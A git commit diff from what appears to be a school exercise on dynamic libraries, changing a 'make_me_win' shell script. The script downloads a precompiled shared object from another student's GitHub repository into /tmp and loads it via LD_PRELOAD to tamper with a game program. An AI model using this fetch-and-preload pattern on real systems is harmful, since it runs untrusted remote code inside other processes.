b89a8a1eab7696e9bebd15ae1ae6ddbbb07174f6
Abbk1109 <abbk1983@gmail.com>
2022-12-12 08:01:00 -0800

    fixed

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/win.sh https://github.com/Abbk1109/alx-low_level_programming/raw/master/0x18-dynamic_libraries/win.sh
-export LD_PRELOAD=/tmp/win.sh
+wget -O /tmp/win.so https://github.com/Zevrov/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
+export LD_PRELOAD=/tmp/win.so
